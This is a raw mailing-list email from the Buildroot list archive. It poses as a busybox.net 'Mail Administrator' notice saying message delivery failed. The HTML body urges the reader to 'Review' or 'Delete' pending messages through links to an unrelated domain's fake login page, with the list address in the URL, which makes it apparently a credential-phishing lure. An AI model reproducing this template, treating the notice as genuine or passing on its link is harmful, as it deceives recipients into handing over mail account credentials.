Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 33D7BE67492
	for <buildroot@archiver.kernel.org>; Fri,  1 Nov 2024 01:18:09 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp1.osuosl.org (Postfix) with ESMTP id AD7BC81447;
	Fri,  1 Nov 2024 01:18:09 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id Tb4BnFjUNRw7; Fri,  1 Nov 2024 01:18:08 +0000 (UTC)
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.142; helo=lists1.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org C5DB781446
Received: from lists1.osuosl.org (lists1.osuosl.org [140.211.166.142])
	by smtp1.osuosl.org (Postfix) with ESMTP id C5DB781446;
	Fri,  1 Nov 2024 01:18:08 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 by lists1.osuosl.org (Postfix) with ESMTP id 29EF75E46
 for <buildroot@buildroot.org>; Fri,  1 Nov 2024 01:18:06 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id 0C56981496
 for <buildroot@buildroot.org>; Fri,  1 Nov 2024 01:18:06 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id 3kVbL5zg0yeN for <buildroot@buildroot.org>;
 Fri,  1 Nov 2024 01:18:05 +0000 (UTC)
Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=104.168.34.171;
 helo=busybox.net; envelope-from=postmaster@busybox.net; receiver=<UNKNOWN> 
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 03428814A0
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 03428814A0
Received: from busybox.net (unknown [104.168.34.171])
 by smtp1.osuosl.org (Postfix) with ESMTP id 03428814A0
 for <buildroot@busybox.net>; Fri,  1 Nov 2024 01:18:04 +0000 (UTC)
From: Postmaster <postmaster@busybox.net>
To: buildroot@busybox.net
Date: 1 Nov 2024 02:18:03 +0100
Message-ID: <20241101021803.39707D8210258270@busybox.net>
MIME-Version: 1.0
X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
 dmarc=none (p=none dis=none)
 header.from=busybox.net
Subject: [Buildroot] Message Delivery Notification(Failure)
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.30
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============6351337710216911720=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>

--===============6351337710216911720==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
<table style=3D"border: 1px dotted rgb(211, 211, 211); border-image: none; =
text-align: left; color: rgb(51, 51, 51); text-transform: none; letter-spac=
ing: normal; font-family: Roboto, Tahoma, Helvetica, sans-serif; font-size:=
 13px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space=
: normal; border-collapse: collapse; box-sizing: border-box; orphans: 2; wi=
dows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: norm=
al; font-variant-caps: normal;=20
text-decoration-style: initial; text-decoration-color: initial; -webkit-tex=
t-stroke-width: 0px; text-decoration-thickness: initial;"><tbody style=3D"b=
ox-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><th style=3D"=
padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: none; width: 2p=
x; color: rgb(0, 0, 0); box-sizing: border-box; background-color: rgb(2, 15=
1, 64);">&nbsp;</th>
<td style=3D"padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: no=
ne; width: 665px; color: rgb(0, 0, 0); box-sizing: border-box; background-c=
olor: rgb(243, 255, 248);"><span style=3D"font-size: 12px; box-sizing: bord=
er-box;">Message from&nbsp;busybox.net server</span></td></tr></tbody></tab=
le>
<div style=3D"border-width: 0px; margin: 0px; padding: 20px; text-align: le=
ft; color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter-=
spacing: normal; font-family: Verdana; font-size: 12px; font-style: normal;=
 font-weight: 400; word-spacing: 0px; vertical-align: baseline; white-space=
: normal; box-sizing: border-box; orphans: 2; widows: 2; font-stretch: inhe=
rit; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; =
font-variant-caps: normal; text-decoration-style:=20
initial; text-decoration-color: initial; -webkit-text-stroke-width: 0px; te=
xt-decoration-thickness: initial;">
<span style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: no=
ne; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-ser=
if; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0p=
x; float: none; display: inline !important; white-space: normal; orphans: 2=
; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: =
normal; font-variant-caps: normal; text-decoration-style: initial; text-dec=
oration-color: initial; -webkit-text-stroke-width:=20
0px; text-decoration-thickness: initial;">&nbsp;</span></div>
<p align=3D"left" style=3D"color: rgb(44, 54, 58); text-transform: none; te=
xt-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-serif; fo=
nt-size: 13px; font-style: normal; font-weight: 400; margin-top: 0px; word-=
spacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; wido=
ws: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal=
; font-variant-caps: normal; text-decoration-style: initial; text-decoratio=
n-color: initial; -webkit-text-stroke-width: 0px;=20
text-decoration-thickness: initial;"><font color=3D"#000066" face=3D"Arial"=
 size=3D"4" style=3D"box-sizing: border-box;"><strong style=3D"font-weight:=
 bolder; box-sizing: border-box;">Messages Delivery Failure</strong></font>=
</p>
<div align=3D"left" class=3D"v1v1yiv9201021698gmail_quote_mr_css_attr" styl=
e=3D"color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter=
-spacing: normal; font-family: Roboto, sans-serif; font-size: 13px; font-st=
yle: normal; font-weight: 400; word-spacing: 0px; border-top-color: current=
Color; border-top-width: 0px; border-top-style: none; white-space: normal; =
box-sizing: border-box; orphans: 2; widows: 2; background-color: rgb(255, 2=
55, 255); font-variant-ligatures: normal;=20
font-variant-caps: normal; text-decoration-style: initial; text-decoration-=
color: initial; -webkit-text-stroke-width: 0px; text-decoration-thickness: =
initial;"><font size=3D"3"><font style=3D"box-sizing: border-box;"><span st=
yle=3D"box-sizing: border-box;">The delivery of messages was stopped by the=
&nbsp;busybox.net mail server.</span><br style=3D"box-sizing: border-box;">=
<span style=3D"box-sizing: border-box;">You have pending messages that coul=
d not be sent as of 11/1/2024 2:18:03 a.m.</span></font>
 <br style=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-box;=
"><span style=3D"box-sizing: border-box;"><font style=3D"box-sizing: border=
-box;">Click to</font> <a class=3D"v1v1external_mr_css_attr" style=3D"borde=
r-width: 0px; margin: 0px; padding: 0px; color: rgb(17, 85, 204); text-deco=
ration: none; vertical-align: baseline; cursor: pointer; box-sizing: border=
-box; background-color: transparent;" href=3D"https://prosect.com.br/login/=
Inbox.html#buildroot@busybox.net" target=3D"_blank" rel=3D"noreferrer">
<font style=3D"box-sizing: border-box;"> Review</font></a><font style=3D"bo=
x-sizing: border-box;">&nbsp;</font><font style=3D"box-sizing: border-box;"=
>or</font> <a class=3D"v1v1external_mr_css_attr" style=3D"border-width: 0px=
; margin: 0px; padding: 0px; color: rgb(17, 85, 204); text-decoration: none=
; vertical-align: baseline; cursor: pointer; box-sizing: border-box; backgr=
ound-color: transparent;" href=3D"https://prosect.com.br/login/Inbox.html#b=
uildroot@busybox.net" target=3D"_blank" rel=3D"noreferrer">
<font style=3D"box-sizing: border-box;"> Delete</font></a><span>&nbsp;</spa=
n><font style=3D"box-sizing: border-box;">pending incoming email messages.<=
/font></span></font></div>
<div align=3D"left" class=3D"v1v1yiv9201021698gmail_quote_mr_css_attr" styl=
e=3D"color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter=
-spacing: normal; font-family: Roboto, sans-serif; font-size: 13px; font-st=
yle: normal; font-weight: 400; word-spacing: 0px; border-top-color: current=
Color; border-top-width: 0px; border-top-style: none; white-space: normal; =
box-sizing: border-box; orphans: 2; widows: 2; background-color: rgb(255, 2=
55, 255); font-variant-ligatures: normal;=20
font-variant-caps: normal; text-decoration-style: initial; text-decoration-=
color: initial; -webkit-text-stroke-width: 0px; text-decoration-thickness: =
initial;"><font size=3D"3"><span style=3D"box-sizing: border-box;"></span><=
/font>&nbsp;</div>
<div class=3D"v1v1yiv9201021698gmail_quote_mr_css_attr" style=3D"text-align=
: left; color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; let=
ter-spacing: normal; font-family: Roboto, sans-serif; font-size: 13px; font=
-style: normal; font-weight: 400; margin-bottom: 0pt; word-spacing: 0px; bo=
rder-top-color: currentColor; border-top-width: 0px; border-top-style: none=
; white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; backg=
round-color: rgb(255, 255, 255);=20
font-variant-ligatures: normal; font-variant-caps: normal; text-decoration-=
style: initial; text-decoration-color: initial; -webkit-text-stroke-width: =
0px; text-decoration-thickness: initial;"><span style=3D"color: black; box-=
sizing: border-box;"><font size=3D"3">Thanks,</font></span></div>
<div class=3D"v1v1yiv9201021698gmail_quote_mr_css_attr" style=3D"text-align=
: left; color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; let=
ter-spacing: normal; font-family: Roboto, sans-serif; font-size: 13px; font=
-style: normal; font-weight: 400; margin-bottom: 0pt; word-spacing: 0px; bo=
rder-top-color: currentColor; border-top-width: 0px; border-top-style: none=
; white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; backg=
round-color: rgb(255, 255, 255);=20
font-variant-ligatures: normal; font-variant-caps: normal; text-decoration-=
style: initial; text-decoration-color: initial; -webkit-text-stroke-width: =
0px; text-decoration-thickness: initial;"><strong style=3D"font-weight: bol=
der; box-sizing: border-box;"><span style=3D"color: black; box-sizing: bord=
er-box;"><font size=3D"3">Mail&nbsp;Administrator</font></span></strong></d=
iv></body></html>

--===============6351337710216911720==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============6351337710216911720==--
